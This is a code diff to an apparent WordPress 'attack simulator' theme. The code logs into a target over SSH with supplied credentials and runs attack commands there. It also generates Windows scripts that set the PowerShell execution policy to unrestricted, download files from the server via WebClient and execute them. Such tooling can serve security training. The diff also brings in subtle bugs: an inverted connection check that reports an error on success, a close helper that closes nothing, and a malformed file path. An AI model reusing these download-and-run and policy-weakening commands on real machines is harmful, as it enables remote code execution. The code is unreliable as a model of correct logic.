@@ -19,6 +19,13 @@ function hooks(){
     add_action( 'wp_ajax_remotely', 'remotely', 1);
 }
 
+function close_connection_send_msg($conn, $msg_type, $msg){
+    $conn = null;
+    if($msg_type == "error")
+        wp_send_json_error($msg);
+    else wp_send_json_success($msg);
+}
+
 /**
  * TODO
  * @return answer for the client.
@@ -32,13 +39,13 @@ function remotely(){ //TODO TEST IT IN LINUX
     $json['username'] = check_getParameterOrSendErrorMSG('username');
     $json['password'] = check_getParameterOrSendErrorMSG('password');
 
-    $con = new ConnectSSH($json['ip'], $json['username'], $json['password']); //TODO PERGUNTAR STOR SE Não tem que ter timeout.
+    $con = new ConnectSSH($json['ip'], $json['username'], $json['password']);
     try{
-        if(!$con->connect())
-            wp_send_json_error($con->get_error_msg());
+        if($con->connect())
+            close_connection_send_msg($con, "error", $con->get_error_msg());
 
         if(count($json['attacks']) == 0)
-            wp_send_json_error(INVALID_ARGUMENTS);
+            close_connection_send_msg($con, "error", INVALID_ARGUMENTS);
 
         $attacks_cmd = null;
         $download_files = null;
@@ -50,17 +57,17 @@ function remotely(){ //TODO TEST IT IN LINUX
             $attacks_cmd .= $json['attacks']->{'linux'};
         }
 
-        else wp_send_json_error(INVALID_ARGUMENTS);
+        else close_connection_send_msg($con, "error", INVALID_ARGUMENTS);
 
         if($attacks_cmd == null)
-            wp_send_json_error(INVALID_ARGUMENTS);
+            close_connection_send_msg($con, "error", INVALID_ARGUMENTS);
 
         $data = $con->exec($attacks_cmd);
         if($data == false)
-            wp_send_json_error($con->get_error_msg());
-        wp_send_json_success("Remote access finished with success!");
+            close_connection_send_msg($con, "error", $con->get_error_msg());
+        close_connection_send_msg($con, "success", "Remote access finished with success!");
     }catch(Exception $ex){
-        wp_send_json_error(REQUEST_GENERAL_ERROR);
+        close_connection_send_msg($con, "error", REQUEST_GENERAL_ERROR);
     }
 }
 /**
@@ -148,13 +155,11 @@ function get_attacksRequested(){
         $jsonMESSAGE = [];
         if(count($win_attacks) > 0){
             $jsonMESSAGE['windows'] = get_windows_attack_text($win_attacks);
-            $jsonMESSAGE['win_attacks_id'] = $win_attacks;
         }
 
         $lin_attacks = get_linuxAttacksFromID($safe_attacksID);
         if(count($lin_attacks) > 0){
             $jsonMESSAGE['linux'] = get_linux_attack_text($lin_attacks);
-            $jsonMESSAGE['lin_attacks_id'] = $lin_attacks;
         }
 
         return json_encode($jsonMESSAGE);
@@ -199,9 +204,11 @@ function get_windows_soft_text($attack_id, $text){
     $software = get_softFromAttackID($attack_id);
     $length = count($software);
     if($length > 0){
+        //powershell set-executionpolicy unrestricted
+        $text .= "powershell set-executionpolicy unrestricted" . WINDOWS_BREAK; //WE REPEAT IT IN CASE THE USER HAS CHANGED THE POLICY IN OTHER CMD
         foreach($software as $s){
-            //bitsadmin /transfer AttackSimulator http://localhost/wordpress/wp-content/themes/AttackSimulatorP/twenty-fifteen-child/handle-get.php?attack_id=22 "%cd%\first.sh"
-            $text .= "bitsadmin /transfer AttackSimulator \"" . DOWNLOAD_FILE_FULL_LINK . $attack_id . "\" \"%cd%\\" . $s->file_name . "\"" . WINDOWS_BREAK;
+            //powershell -Command "$webclient = New-Object System.Net.WebClient;$url = 'http://localhost/wordpress/wp-content/themes/AttackSimulatorP/twenty-fifteen-child/handle-get.php?attack_id=3';$file = '%cd%\My_file.exe';$webclient.DownloadFile($url,$file)"
+            $text .= "powershell -Command \"\$webclient = New-Object System.Net.WebClient;\$url = '" . DOWNLOAD_FILE_FULL_LINK . $attack_id . "';\$file = '%cd%" . $s->file_name . "';\$webclient.DownloadFile(\$url,\$file)\"" . WINDOWS_BREAK;
             $text .= "CALL \"" . $s->file_name . "\"";
             $length -= 1;
             if($length > 0)
